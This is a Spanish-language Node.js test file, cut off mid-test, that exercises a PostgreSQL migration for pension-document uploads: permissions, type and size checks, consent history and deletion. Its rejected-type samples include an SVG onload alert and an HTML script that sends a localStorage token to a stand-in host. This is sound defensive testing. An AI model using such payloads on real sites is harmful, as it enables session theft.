/* ============================================================================
 * TU FONDO DE PENSIONES, EN LA BASE — 28 de octubre de 2026
 *
 *   TG_PG_BIN="C:\Program Files\PostgreSQL\17\bin" node --test pruebas/el-fondo-de-pensiones-postgres.test.js
 *
 * base/20261103_el_fondo_de_pensiones.sql en un PostgreSQL con TODAS las
 * migraciones de base/ en orden (el andamio de Supabase de las otras pruebas
 * de PostgreSQL), corrido DOS veces, y llamando lo que llaman el registro, la
 * app del cliente y el CRM de Joan. Y los ataques que pidió el encargo:
 *
 *   · el EQUIPO pidiendo el archivo: gerente_archivos no lo trae, y las
 *     funciones de Joan no se pueden llamar con la sesión de nadie;
 *   · un TIPO NO PERMITIDO (SVG, HTML, GIF, un ejecutable, texto que dice ser
 *     PDF): no entra, diga lo que diga el teléfono;
 *   · un archivo ENORME: no entra, y se mira antes de decodificarlo;
 *   · BORRAR: lo quita el cliente (uno o todo, y queda la constancia), lo
 *     borra Joan, y se va con la cuenta de acceso por cualquier camino.
 * Sin TG_PG_BIN se salta (la parte que lee el archivo corre siempre).
 * ==========================================================================*/
'use strict';

const { test, describe, before, after } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { execFileSync, spawnSync } = require('node:child_process');

const BIN = process.env.TG_PG_BIN || '';
const RAIZ = path.join(__dirname, '..');
const exe = n => path.join(BIN, process.platform === 'win32' ? n + '.exe' : n);
const STUB = fs.readFileSync(path.join(__dirname, 'una-puerta-postgres.test.js'), 'utf8')
  .match(/const STUB = `([\s\S]*?)`;/)[1];
const NOMBRE = '20261103_el_fondo_de_pensiones.sql';
const SQL = fs.readFileSync(path.join(RAIZ, 'base', NOMBRE), 'utf8');
const CLAVE = 'clave-de-prueba-larga-123';
const MARIA = '3001112233', PEDRO = '3005556677', GER = '3172862539';

/* Archivos de mentira, sin datos de nadie: lo que importa son sus primeros
   bytes (lo único con lo que la base decide el tipo). */
const b64 = s => Buffer.from(s, 'binary').toString('base64');
const PDF = b64('%PDF-1.4\n% historia laboral de mentira\n1 0 obj << >> endobj\n%%EOF\n');
const PDF2 = b64('%PDF-1.7\n% otra historia de mentira\n%%EOF\n');
const PDF3 = b64('%PDF-1.5\n% una tercera\n%%EOF\n');
const PNG = b64('\x89PNG\r\n\x1a\n' + 'IHDR de mentira');
const JPG = b64('\xff\xd8\xff\xe0' + 'JFIF de mentira');
const WEBP = b64('RIFF\x10\x00\x00\x00WEBPVP8 de mentira');

describe('el archivo de la migración', () => {
  const codigo = SQL.replace(/--[^\n]*/g, '');
  test('tablas nuevas con RLS y cerradas; funciones security definer con search_path fijo', () => {
    assert.match(codigo, /create table if not exists public\.pension_autorizaciones/);
    assert.match(codigo, /create table if not exists public\.pension_archivos/);
    assert.match(codigo, /alter table public\.pension_autorizaciones enable row level security;/);
    assert.match(codigo, /alter table public\.pension_archivos enable row level security;/);
    assert.match(codigo, /revoke all on table public\.pension_archivos from public, anon, authenticated;/);
    const funciones = codigo.split(/create or replace function/i).slice(1);
    assert.equal(funciones.length, 10);
    funciones.forEach(f => {
      assert.match(f, /security definer/, 'una función sin security definer: ' + f.slice(0, 60));
      assert.match(f, /set search_path = public/, 'una función sin search_path fijo: ' + f.slice(0, 60));
    });
  });
  test('no reescribe ninguna función de antes, ni toca registro_archivos ni las del equipo', () => {
    const nombres = [...codigo.matchAll(/create or replace function public\.(\w+)/g)].map(m => m[1]);
    nombres.forEach(n => assert.match(n, /^pension_/, 'el archivo reescribe ' + n));
    assert.equal(/registro_archivos_guardar|archivos_de_registro|gerente_archivos/.test(codigo), false);
    assert.equal(/public\.equipo\b|from\s+equipo\b/.test(codigo), false, 'el archivo nombra la tabla del equipo');
    assert.equal(/(insert\s+into|update|delete\s+from)\s+auth\.users\b/i.test(codigo), false, 'escribe en auth.users');
  });
  test('termina en la tabla de comprobaciones que Joan ve', () => {
    assert.match(codigo, /select 1 as n, '[^']+' as comprobacion,/);
    assert.match(codigo, /order by 1;\s*$/);
    /* bool_and salta los null: un paso de la prueba que no se pudo mirar no puede contar como bueno. */
    assert.match(codigo, /bool_and\(coalesce\(ok, false\)\) from pension_prueba/);
  });
  /* 28-oct-2026 (arreglo, ronda 2) — el cortacircuito, como en chat_fotos y
     fotos_equipo: mira el TOTAL, justo antes de escribir y después de «ya
     estaba» (un reintento de lo que ya entró no es escritura nueva). */
  test('subir lleva su cortacircuito: el total de pension_archivos, antes de escribir y después de «ya estaba»', () => {
    const subir = codigo.split(/create or replace function public\.pension_subir/)[1].split(/create or replace function/)[0];
    const corte = subir.indexOf("if pg_total_relation_size('public.pension_archivos') > 50 * 1024 * 1024 then");
    assert.ok(corte > 0, 'pension_subir no mira el total de la tabla');
    assert.match(subir.slice(corte), /^[^;]*then\s*return jsonb_build_object\('ok', false, 'motivo', 'lleno'\);/);
    assert.ok(corte < subir.indexOf('insert into public.pension_archivos'), 'el cortacircuito va después de escribir');
    assert.ok(corte > subir.indexOf("'ya_estaba', true"), 'el reintento de lo que ya entró recibiría «lleno»');
  });
  /* 28-oct-2026 (arreglo de los leves, P14) — el resumen de Joan trae lo
     ocupado con EL MISMO tope del cortacircuito: si uno se mueve sin el otro,
     Joan leería «va en 80 %» de un tope que no es el que corta. */
  test('el resumen de Joan dice cuánto va ocupado, con el mismo tope del cortacircuito', () => {
    const tope = s => (s.match(/pg_total_relation_size\('public\.pension_archivos'\)[^;]*?(\d+ \* 1024 \* 1024)/) || [])[1];
    const subir = codigo.split(/create or replace function public\.pension_subir/)[1].split(/create or replace function/)[0];
    const resumen = codigo.split(/create or replace function public\.pension_resumen/)[1].split(/create or replace function/)[0];
    assert.match(resumen, /'espacio', jsonb_build_object\('ocupado', pg_total_relation_size\('public\.pension_archivos'\), 'tope', \d+ \* 1024 \* 1024\)/,
      'pension_resumen no dice cuánto va ocupado');
    assert.ok(tope(subir), 'no encontré el tope de pension_subir');
    assert.equal(tope(resumen), tope(subir), 'el resumen y el cortacircuito tienen topes distintos');
  });
});

describe('el fondo de pensiones, en un PostgreSQL de verdad', { skip: !BIN && 'sin TG_PG_BIN no hay PostgreSQL a mano' }, () => {
  let dir, puerto, n = 0;
  const sql = (consulta, db) => {
    const f = path.join(dir, 'q' + (++n) + '.sql');
    fs.writeFileSync(f, consulta, 'utf8');
    return execFileSync(exe('psql'),
      ['-h', 'localhost', '-p', String(puerto), '-U', 'postgres', '-d', db || 'tg', '-At', '-v', 'ON_ERROR_STOP=1', '-f', f],
      { encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'], env: Object.assign({}, process.env, { PGCLIENTENCODING: 'UTF8' }),
        maxBuffer: 64 * 1024 * 1024 }).trim();
  };
  /* Lo mismo, sin reventar: para ver el error de un permiso negado. */
  const sqlCrudo = consulta => {
    const f = path.join(dir, 'q' + (++n) + '.sql');
    fs.writeFileSync(f, consulta, 'utf8');
    return spawnSync(exe('psql'),
      ['-h', 'localhost', '-p', String(puerto), '-U', 'postgres', '-d', 'tg', '-At', '-v', 'ON_ERROR_STOP=1', '-f', f],
      { encoding: 'utf8', env: Object.assign({}, process.env, { PGCLIENTENCODING: 'UTF8' }) });
  };
  const archivo = (f, una) => spawnSync(exe('psql'),
    ['-h', 'localhost', '-p', String(puerto), '-U', 'postgres', '-d', 'tg', '-At', '-v', 'ON_ERROR_STOP=1'].concat(una ? ['-1'] : []).concat(['-f', f]),
    { encoding: 'utf8', env: Object.assign({}, process.env, { PGCLIENTENCODING: 'UTF8' }) });
  const uid = cel => "md5('cuenta-" + cel + "')::uuid";
  const lit = s => "'" + String(s).replace(/'/g, "''") + "'";
  /* Como la sesión de esa cuenta, con el ROL de la sesión (authenticated):
     así PostgreSQL mira los permisos de verdad, como PostgREST. */
  const comoRol = (rol, cel, q, iat) => sqlCrudo(
    (cel ? "select set_config('request.jwt.claims', '{\"sub\":\"' || " + uid(cel) + " || '\",\"email\":\"57" + cel +
      "@tugarantia.net\",\"role\":\"authenticated\",\"iat\":' || floor(extract(epoch from now()) + " + (iat || 0) + ") || '}', false);"
      : "select set_config('request.jwt.claims', '', false);") +
    ' set role ' + rol + '; select (' + q + ')::text;');
  const como = (cel, q, iat) => {
    const r = comoRol('authenticated', cel, q, iat);
    assert.equal(r.status, 0, 'la llamada falló: ' + r.stderr);
    return r.stdout.trim().split(/\r?\n/).pop();
  };
  const jsonComo = (cel, q, iat) => JSON.parse(como(cel, q, iat));
  const comoAnon = q => {
    const r = comoRol('anon', null, q);
    assert.equal(r.status, 0, 'la llamada de Joan falló: ' + r.stderr);
    return JSON.parse(r.stdout.trim().split(/\r?\n/).pop());
  };
  const cuenta = (cel, meta) => sql(
    'delete from auth.users where id = ' + uid(cel) + ';' +
    ' insert into auth.users (id, email, encrypted_password, email_confirmed_at, created_at, raw_user_meta_data) values (' + uid(cel) +
    ", '57" + cel + "@tugarantia.net', 'x', now(), now() - interval '60 seconds', " + lit(JSON.stringify(meta || {})) + '::jsonb)');
  const autorizar = (cel, fondos) => jsonComo(cel, 'public.pension_autorizar(array[' +
    (fondos || []).map(lit).join(',') + "]::text[], '2026-11-03', '2026-11-03T10:00:00.000Z')");
  const subir = (cel, b) => jsonComo(cel, 'public.pension_subir(' + lit(b) + ')');
  const filas = cel => sql("select count(*) from public.pension_archivos where celular = '" + cel + "'");
  const limpiarFreno = cel => sql("delete from public.intentos_fallidos where cedula = 'hl:" + cel + "'");

  before(() => {
    dir = fs.mkdtempSync(path.join(os.tmpdir(), 'tg-pg-pension-'));
    puerto = 58000 + Math.floor(Math.random() * 380);
    execFileSync(exe('initdb'), ['-D', path.join(dir, 'datos'), '-U', 'postgres', '-A', 'trust', '-E', 'UTF8', '--locale=C'], { stdio: 'ignore' });
    execFileSync(exe('pg_ctl'), ['-D', path.join(dir, 'datos'), '-o', '-p ' + puerto + ' -c listen_addresses=localhost -c shared_buffers=32MB',
      '-l', path.join(dir, 'pg.log'), '-w', 'start'], { stdio: 'ignore' });
    sql("create database tg template template0 encoding 'UTF8' locale_provider icu icu_locale 'es-CO' locale 'C'", 'postgres');
    fs.writeFileSync(path.join(dir, 'stub.sql'), STUB);
    archivo(path.join(dir, 'stub.sql'));
    sql(`do $$ begin if not exists (select 1 from pg_roles where rolname = 'service_role') then create role service_role nologin; end if; end $$;
         grant usage on schema public to service_role;
         alter default privileges in schema public grant execute on functions to service_role;
         alter table auth.users add column if not exists banned_until timestamptz;
         alter table auth.users add column if not exists email_confirmed_at timestamptz;`);
    const migs = ['supabase.sql'].concat(fs.readdirSync(path.join(RAIZ, 'base'))
      .filter(f => /^\d{8}.*\.sql$/.test(f) && f !== NOMBRE).sort());
    migs.forEach(f => {
      const t = fs.readFileSync(path.join(RAIZ, 'base', f), 'utf8').replace(/^\s*create extension if not exists pg_net[^;]*;/im, '');
      const copia = path.join(dir, f); fs.writeFileSync(copia, t);
      archivo(copia, true);   // las que dependen de Supabase de verdad fallan solas
      if (f === 'supabase.sql') sql("update public.config_privada set valor = '" + CLAVE + "' where clave = 'clave_sync'");
    });
    /* El equipo de Joan: WILLIAN gerente, con la clave de Joan puesta DESPUÉS de
       crear su cuenta (20261022d), y María en su base: él ve su registro. */
    sql("select public.equipo_publicar('" + CLAVE + "', '[{\"celular\":\"" + GER + "\",\"nombre\":\"WILLIAN\",\"rol\":\"gerente\"}]'::jsonb," +
      " '[{\"id\":\"a1\",\"persona_id\":\"p1\",\"asesor\":\"" + GER + "\",\"desde\":\"2026-10-01\"}]'::jsonb," +
      " '[{\"id\":\"p1\",\"tipo\":\"prospecto\",\"celular\":\"" + MARIA + "\",\"nombre\":\"MARIA DE MENTIRA\"}]'::jsonb)");
    cuenta(GER, {});
    sql("select public.equipo_poner_clave('" + GER + "', 'la-clave-de-joan-1')");
    sql("insert into public.registros (codigo, cedula, nombre, telefono, datos, origen) values ('', '52123456', 'Maria De Mentira', '" + MARIA +
      "', '{\"documento\":\"52123456\"}', 'abierto');" +
      " insert into public.registro_archivos (celular, tipo, imagen) values ('" + MARIA + "', 'cedula_frente', 'data:image/jpeg;base64,RlJFTlRF')");
    cuenta(MARIA, { autorizacion: { general: true, sensibles: true } });
    cuenta(PEDRO, { autorizacion: { general: true, sensibles: false } });
    /* El archivo de hoy, DOS veces: tiene que ser idempotente, y su tabla de
       comprobaciones sale entera y en true las dos veces. */
    [1, 2].forEach(i => {
      const r = archivo(path.join(RAIZ, 'base', NOMBRE), true);
      assert.equal(r.status, 0, 'la migración no corrió limpia la vez ' + i + ': ' + r.stderr);
      const comp = r.stdout.trim().split(/\r?\n/).filter(l => /^\d+\|.*\|[tf]?$/.test(l));
      assert.equal(comp.length, 10, 'la tabla de comprobaciones no salió entera: ' + r.stdout);
      comp.forEach(l => assert.match(l, /\|t$/, 'una comprobación salió en false: ' + l));
    });
  });

  after(() => {
    try { execFileSync(exe('pg_ctl'), ['-D', path.join(dir, 'datos'), '-m', 'fast', 'stop'], { stdio: 'ignore' }); } catch (e) { /* nada */ }
    try { fs.rmSync(dir, { recursive: true, force: true }); } catch (e) { /* nada */ }
  });

  test('el camino del cliente: autoriza, sube su PDF y sus pantallazos, y ve lo suyo SIN el contenido', () => {
    const a = autorizar(MARIA, ['colpensiones', 'porvenir']);
    assert.equal(a.ok, true, JSON.stringify(a));
    assert.deepEqual(a.fondos, ['colpensiones', 'porvenir']);
    const p = subir(MARIA, PDF);
    assert.equal(p.ok, true, JSON.stringify(p));
    assert.equal(p.tipo, 'pdf');
    assert.equal(p.sha256, require('node:crypto').createHash('sha256').update(Buffer.from(PDF, 'base64')).digest('hex'));
    assert.equal(subir(MARIA, 'data:image/png;base64,' + PNG).tipo, 'png', 'el prefijo data: no se quitó');
    assert.equal(subir(MARIA, JPG).tipo, 'jpg');
    assert.equal(subir(MARIA, WEBP).tipo, 'webp');
    const mia = jsonComo(MARIA, 'public.pension_mia()');
    assert.equal(mia.ok, true);
    assert.deepEqual(mia.autorizacion.fondos, ['colpensiones', 'porvenir']);
    assert.equal(mia.autorizacion.version, '2026-11-03');
    assert.deepEqual(mia.archivos.map(x => x.tipo), ['pdf', 'png', 'jpg', 'webp']);
    assert.equal(/base64|datos|JVBER/.test(JSON.stringify(mia)), false, 'pension_mia devolvió el contenido');
  });

  test('el mismo archivo dos veces (un reintento con la señal floja) no se duplica', () => {
    const r = subir(MARIA, PDF);
    assert.equal(r.ok, true);
    assert.equal(r.ya_estaba, true);
    assert.equal(sql("select count(*) from public.pension_archivos where celular = '" + MARIA + "' and tipo = 'pdf'"), '1');
  });

  test('Joan, con su clave: el resumen sin archivos, el detalle sin contenido, y UN archivo al tocar «Ver»', () => {
    const r = comoAnon("public.pension_resumen('" + CLAVE + "')");
    const yo = r.personas.find(x => x.celular === MARIA);
    assert.ok(yo, 'el resumen no trae a María');
    assert.equal(yo.pdf, 1);
    assert.equal(yo.imagenes, 3);
    assert.deepEqual(yo.fondos, ['colpensiones', 'porvenir']);
    assert.equal(/base64|JVBER/.test(JSON.stringify(r)), false, 'el resumen trae contenido');
    /* 28-oct-2026 (arreglo de los leves, P14) — y cuánto va ocupado, de verdad. */
    assert.equal(r.espacio.tope, 50 * 1024 * 1024);
    assert.equal(r.espacio.ocupado, Number(sql("select pg_total_relation_size('public.pension_archivos')")), 'lo ocupado no es lo de la tabla');
    assert.ok(r.espacio.ocupado > 0);
    const d = comoAnon("public.pension_de('" + CLAVE + "', '+57 300 111 2233')");
    assert.equal(d.archivos.length, 4);
    assert.equal(/base64/.test(JSON.stringify(d)), false);
    const pdf = d.archivos.find(x => x.tipo === 'pdf');
    const f = comoAnon("public.pension_archivo('" + CLAVE + "', " + pdf.id + ')');
    assert.equal(f.ok, true);
    assert.equal(f.tipo, 'pdf');
    assert.equal(f.base64, PDF, 'el archivo no llegó igual');
    assert.equal(/\n/.test(f.base64), false);
  });

  test('ATAQUE: el equipo pidiendo el archivo — gerente_archivos no lo trae, y las de Joan no abren con ninguna sesión', () => {
    /* El gerente SÍ ve el registro de María (es de su base): sus fotos de
       cédula, y nada de su historia laboral. */
    const g = como(GER, "public.gerente_archivos('" + MARIA + "')", 5);
    assert.match(g, /RlJFTlRF/, 'el gerente no vio el registro de su base (la prueba no prueba nada)');
    assert.equal(/JVBER|pension|historia|fondo/i.test(g), false, 'gerente_archivos devolvió algo de la historia laboral: ' + g.slice(0, 300));
    /* Con su sesión (rol authenticated), las de Joan NO se pueden llamar. */
    const id = sql("select min(id) from public.pension_archivos where celular = '" + MARIA + "'");
    [["public.pension_archivo('" + CLAVE + "', " + id + ')'], ["public.pension_resumen('" + CLAVE + "')"],
     ["public.pension_de('" + CLAVE + "', '" + MARIA + "')"], ["public.pension_borrar('" + CLAVE + "', '" + MARIA + "')"]].forEach(([q]) => {
      const r = comoRol('authenticated', GER, q, 5);
      assert.notEqual(r.status, 0, 'el gerente llamó ' + q);
      assert.match(r.stderr, /permission denied/, r.stderr);
    });
    /* Y con su sesión, lo «suyo» es lo suyo: no le sale lo de María. */
    const suyo = jsonComo(GER, 'public.pension_mia()', 5);
    assert.deepEqual(suyo.archivos, []);
    assert.equal(suyo.autorizacion, null);
    /* Ni puede quitarle un archivo a María. */
    assert.equal(jsonComo(GER, 'public.pension_quitar(' + id + ')', 5).borrados, 0);
    assert.equal(filas(MARIA), '4');
  });

  test('ATAQUE: sin la clave de Joan no se lee nada, ni con la llave pública', () => {
    const r = comoRol('anon', null, "public.pension_archivo('una-clave-inventada-larga', 1)");
    assert.notEqual(r.status, 0);
    assert.match(r.stderr, /clave de sincronización incorrecta/);
    /* Las del cliente no abren con la llave pública. */
    const s = comoRol('anon', null, "public.pension_subir('" + PDF + "')");
    assert.match(s.stderr, /permission denied/);
    /* Y el freno de la clave cuenta ese intento: se vuelve a cero con la buena. */
    comoAnon("public.pension_resumen('" + CLAVE + "')");
  });

  test('ATAQUE: un tipo no permitido no entra, diga lo que diga el teléfono', () => {
    limpiarFreno(PEDRO);
    assert.equal(autorizar(PEDRO, ['skandia']).ok, true);
    const malos = {
      svg: 'data:image/svg+xml;base64,' + b64('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>'),
      svg_como_pdf: 'data:application/pdf;base64,' + b64('<?xml version="1.0"?><svg/>'),
      html: b64('<!doctype html><html><script>fetch("//x/"+localStorage.joan_socios_sb)</script>'),
      gif: b64('GIF89a\x01\x00\x01\x00'),
      exe: b64('MZ\x90\x00\x03\x00'),
      pdf_falso: b64(' %PDF-1.4 con un espacio delante'),
      riff_no_webp: b64('RIFF\x10\x00\x00\x00WAVEfmt ')
    };
    Object.keys(malos).forEach(k => {
      const r = subir(PEDRO, malos[k]);
      assert.deepEqual([k, r.ok, r.motivo], [k, false, 'tipo_no_permitido']);
    });
    ['no es base64 !!', 'QUJD=X', ''].forEach(x => {
      const r = subir(PEDRO, x);
      assert.equal(r.ok, false);
      assert.ok(['no_es_archivo', 'vacio'].includes(r.motivo), x + ' → ' + r.motivo);
    });
    assert.equal(filas(PEDRO), '0', 'entró algo que no es PDF ni imagen');
  });

  test('ATAQUE: un archivo enorme no entra, y se mira ANTES de decodificarlo', () => {
    limpiarFreno(PEDRO);
    /* 3 MB y un byte: el tope de un archivo. */
    const grande = sql("select encode(convert_to('%PDF-', 'UTF8') || decode(repeat('41', 3145724), 'hex'), 'base64')").replace(/\s+/g, '');
    assert.equal(Buffer.from(grande, 'base64').length, 3145729);
    assert.equal(subir(PEDRO, grande).motivo, 'muy_grande');
    /* Un texto de 4,5 millones de letras se rechaza sin decodificar. */
    assert.equal(jsonComo(PEDRO, "public.pension_subir(repeat('A', 4500001))").motivo, 'muy_grande');
    /* Justo en el tope (3 MB), entra. */
    const justo = sql("select encode(convert_to('%PDF-', 'UTF8') || decode(repeat('41', 3145723), 'hex'), 'base64')").replace(/\s+/g, '');
    const r = subir(PEDRO, justo);
    assert.equal(r.ok, true, JSON.stringify(r));
    assert.equal(r.bytes, 3145728);
  });

  test('los topes: 2 PDF, 5 imágenes y 12 MB entre todos', () => {
    limpiarFreno(PEDRO);
    sql("delete from public.pension_archivos where celular = '" + PEDRO + "'");
    assert.equal(subir(PEDRO, PDF).ok, true);
    assert.equal(subir(PEDRO, PDF2).ok, true);
    assert.equal(subir(PEDRO, PDF3).motivo, 'demasiados', 'entró un tercer PDF');
    for (let i = 0; i < 5; i++) assert.equal(subir(PEDRO, b64('\x89PNG\r\n\x1a\n' + 'imagen ' + i)).ok, true);
    assert.equal(subir(PEDRO, b64('\x89PNG\r\n\x1a\n' + 'la sexta')).motivo, 'demasiados', 'entró una sexta imagen');
    sql("delete from public.pension_archivos where celular = '" + PEDRO + "'");
    limpiarFreno(PEDRO);
    /* 12 MB: cuatro imágenes de casi 3 MB llenan; la quinta ya no cabe. */
    for (let i = 0; i < 4; i++) {
      const img = sql("select encode(decode('ffd8ff', 'hex') || decode(repeat('" + (i + 1) + "1', 3145000), 'hex'), 'base64')").replace(/\s+/g, '');
      assert.equal(subir(PEDRO, img).ok, true, 'la imagen ' + i + ' no entró');
    }
    const quinta = sql("select encode(decode('ffd8ff', 'hex') || decode(repeat('51', 3000), 'hex'), 'base64')").replace(/\s+/g, '');
    assert.equal(subir(PEDRO, quinta).motivo, 'sin_espacio');
    sql("delete from public.pension_archivos where celular = '" + PEDRO + "'");
  });

  test('las reglas de los fondos: «No sé» y «Nunca» van solos; Colpensiones con UN fondo privado; nada inventado', () => {
    limpiarFreno(PEDRO);
    assert.equal(autorizar(PEDRO, ['no_se', 'porvenir']).motivo, 'fondos');
    assert.equal(autorizar(PEDRO, ['nunca', 'colpensiones']).motivo, 'fondos');
    assert.equal(autorizar(PEDRO, ['porvenir', 'proteccion']).motivo, 'fondos');
    assert.equal(autorizar(PEDRO, ['colpensiones', 'porvenir', 'skandia']).motivo, 'fondos');
    assert.equal(autorizar(PEDRO, ['<script>']).motivo, 'fondos');
    assert.equal(autorizar(PEDRO, ['colpensiones', 'skandia']).ok, true);
    assert.equal(autorizar(PEDRO, []).ok, true, 'autorizar sin escoger fondo (quien no sabe) no entró');
    assert.equal(jsonComo(PEDRO, "public.pension_autorizar(array['nunca'], 'ayer', null)").motivo, 'version');
    /* La constancia anterior queda en el historial, SIN el fondo. */
    const h = JSON.parse(sql("select historial::text from public.pension_autorizaciones where celular = '" + PEDRO + "'"));
    assert.ok(h.length >= 2);
    assert.equal(/skandia|colpensiones/.test(JSON.stringify(h)), false, 'el historial guarda el fondo');
  });

  /* 28-oct-2026 (arreglo de los leves, P6) — CAMBIAR DE FONDO NO ES FIRMAR.
     La tarjeta de la app llamaba pension_autorizar con la versión del texto
     del código en cada toque de un fondo, y la base pisaba la versión, el
     momento y la hora de la constancia: el día que el texto cambie, cambiar de
     fondo anotaría que la persona aceptó un texto que nunca marcó. Sin versión
     solo cambia el fondo. Con el SQL de antes, la llamada sin versión contesta
     «version» y esta prueba falla. */
  test('CAMBIAR DE FONDO NO ES FIRMAR: sin versión solo cambia el fondo; la constancia se queda, y una retirada no vuelve', () => {
    const LUZ = '3007778899', NADIE = '3007778800';
    cuenta(LUZ, {}); cuenta(NADIE, {});
    limpiarFreno(LUZ); limpiarFreno(NADIE);
    assert.equal(autorizar(LUZ, ['porvenir']).ok, true);
    /* La constancia en un momento fijo del pasado: si algo la pisa, se nota. */
    sql("update public.pension_autorizaciones set recibida_en = '2026-11-03 10:00:00+00', momento = 'la hora de su telefono' where celular = '" + LUZ + "'");
    const constancia = () => sql("select version || '|' || coalesce(momento, '') || '|' || to_char(recibida_en at time zone 'UTC', 'YYYY-MM-DD HH24:MI:SS')" +
      " || '|' || jsonb_array_length(historial) || '|' || (revocada_en is null) from public.pension_autorizaciones where celular = '" + LUZ + "'");
    const antes = constancia();
    assert.equal(antes, '2026-11-03|la hora de su telefono|2026-11-03 10:00:00|0|true');
    const r = jsonComo(LUZ, "public.pension_autorizar(array['colpensiones','skandia']::text[], null, null)");
    assert.deepEqual([r.ok, r.fondos, r.version], [true, ['colpensiones', 'skandia'], '2026-11-03'], JSON.stringify(r));
    assert.equal(constancia(), antes, 'cambiar de fondo pisó la constancia de la autorización');
    assert.equal(sql("select array_to_string(fondos, ',') from public.pension_autorizaciones where celular = '" + LUZ + "'"), 'colpensiones,skandia');
    /* Las reglas de los fondos valen igual sin versión. */
    assert.equal(jsonComo(LUZ, "public.pension_autorizar(array['porvenir','proteccion']::text[], null, null)").motivo, 'fondos');
    /* Con versión es la casilla: esa sí firma (la constancia anterior va al historial). */
    assert.equal(autorizar(LUZ, ['colpensiones']).ok, true);
    assert.notEqual(constancia(), antes, 'marcar la casilla de nuevo no firmó');
    /* Retirada, cambiar de fondo NO la vuelve a dar. */
    jsonComo(LUZ, 'public.pension_retirar()');
    const x = jsonComo(LUZ, "public.pension_autorizar(array['porvenir']::text[], null, null)");
    assert.deepEqual([x.ok, x.motivo], [false, 'sin_autorizacion'], JSON.stringify(x));
    assert.equal(sql("select (revocada_en is not null) || '|' || cardinality(fondos) from public.pension_autorizaciones where celular = '" + LUZ + "'"), 'true|0',
      'cambiar de fondo devolvió una autorización retirada');
    /* Y quien nunca autorizó tampoco queda autorizado por escoger un fondo. */
    assert.equal(jsonComo(NADIE, "public.pension_autorizar(array['porvenir']::text[], null, null)").motivo, 'sin_autorizacion');
    assert.equal(sql("select count(*) from public.pension_autorizaciones where celular = '" + NADIE + "'"), '0');
    sql("delete from public.pension_autorizaciones where celular in ('" + LUZ + "', '" + NADIE + "')");
    limpiarFreno(LUZ); limpiarFreno(NADIE);
  });

  test('el freno: 30 escrituras cada 15 minutos por cuenta', () => {
    limpiarFreno(PEDRO);
    let ultimo = null;
    for (let i = 0; i < 31; i++) ultimo = autorizar(PEDRO, ['nunca']);
    assert.equal(ultimo.motivo, 'freno');
    limpiarFreno(PEDRO);
  });

  test('BORRAR (el cliente): quitar UNO, y retirar la autorización se lleva todo y deja la constancia sin el fondo', () => {
    const d = jsonComo(MARIA, 'public.pension_mia()');
    const png = d.archivos.find(x => x.tipo === 'png');
    assert.equal(jsonComo(MARIA, 'public.pension_quitar(' + png.id + ')').borrados, 1);
    assert.equal(filas(MARIA), '3');
    const r = jsonComo(MARIA, 'public.pension_retirar()');
    assert.equal(r.borrados, 3);
    assert.equal(filas(MARIA), '0');
    const a = jsonComo(MARIA, 'public.pension_mia()').autorizacion;
    assert.ok(a.revocada_en, 'no quedó cuándo la retiró');
    assert.deepEqual(a.fondos, [], 'se quedó el fondo después de retirar');
    /* Retirada, ya no entra nada hasta que la vuelva a dar. */
    assert.equal(subir(MARIA, PDF).motivo, 'sin_autorizacion');
    assert.equal(autorizar(MARIA, ['colpensiones']).ok, true);
    assert.equal(subir(MARIA, PDF).ok, true);
  });

  test('BORRAR (Joan): pension_borrar se lleva los archivos y la autorización, y dice cuántos', () => {
    const r = comoAnon("public.pension_borrar('" + CLAVE + "', '" + MARIA + "')");
    assert.deepEqual([r.ok, r.archivos, r.autorizaciones], [true, 1, 1]);
    assert.equal(sql("select count(*) from public.pension_autorizaciones where celular = '" + MARIA + "'"), '0');
    assert.equal(comoAnon("public.pension_borrar('" + CLAVE + "', '12')").motivo, 'celular');
  });

  test('BORRAR (la cuenta): «🧪 Borrar y repetir» y la cuenta borrada a mano se llevan la historia laboral', () => {
    limpiarFreno(MARIA);
    assert.equal(autorizar(MARIA, ['porvenir']).ok, true);
    assert.equal(subir(MARIA, PDF2).ok, true);
    const r = comoAnon("public.borrar_cuenta_de_pruebas('" + CLAVE + "', '" + MARIA + "')");
    assert.equal(r.ok, true, JSON.stringify(r));
    assert.equal(filas(MARIA), '0', 'borrar la cuenta dejó su historia laboral');
    assert.equal(sql("select count(*) from public.pension_autorizaciones where celular = '" + MARIA + "'"), '0');
    /* Y la borrada a mano (Supabase → Authentication → borrar). */
    limpiarFreno(PEDRO);
    assert.equal(autorizar(PEDRO, ['skandia']).ok, true);
    assert.equal(subir(PEDRO, PDF3).ok, true);
    sql('delete from auth.users where id = ' + uid(PEDRO));
    assert.equal(filas(PEDRO), '0');
    assert.equal(sql("select count(*) from public.pension_autorizaciones where celular = '" + PEDRO + "'"), '0');
  });

  /* 28-oct-2026 (arreglo, ronda 2) — EL CORTACIRCUITO. Los topes de
     pension_subir eran todos POR PERSONA (2 PDF, 5 imágenes, 12 MB), y el
     registro está abierto: cualquiera abre cuentas con celulares inventados.
     Los refutadores lo probaron en un PostgreSQL local: 26 cuentas, 104
     archivos de 3 MB, 0 rechazos, 323 MB, y la cuenta 27 todavía entraba. En
     el plan gratis (500 MB) eso deja la base ENTERA de solo lectura. Aquí,
     lo que dejarían unas cinco cuentas inventadas con su tope lleno: 51 MB de
     bytes al azar (no se comprimen, como un JPG de verdad). Con el código de
     antes, el segundo archivo de Ana entra y esta prueba falla. */
  test('ATAQUE: cuentas inventadas no llenan la base — pasado su trozo de 50 MB, pension_subir dice «lleno» y no escribe', () => {
    const ANA = '3002223344';
    cuenta(ANA, {});
    limpiarFreno(ANA);
    assert.equal(autorizar(ANA, ['colpensiones']).ok, true);
    assert.equal(subir(ANA, PDF).ok, true, 'con espacio, su PDF no entró');
    sql(`insert into public.pension_archivos (celular, tipo, datos, bytes, sha256)
         select '32099900' || lpad(i::text, 2, '0'), 'jpg', x.d, octet_length(x.d), encode(sha256(x.d), 'hex')
           from generate_series(1, 17) i,
                lateral (select decode('ffd8ff', 'hex') || string_agg(extensions.gen_random_bytes(1024), ''::bytea) as d
                           from generate_series(1, 3071) g where i > 0) x`);
    const tam = Number(sql("select pg_total_relation_size('public.pension_archivos')"));
    assert.ok(tam > 50 * 1024 * 1024, 'la prueba no pasó de 50 MB: ' + tam);
    const r = subir(ANA, PNG);
    assert.deepEqual([r.ok, r.motivo], [false, 'lleno'], 'con la tabla por encima de su trozo, entró: ' + JSON.stringify(r));
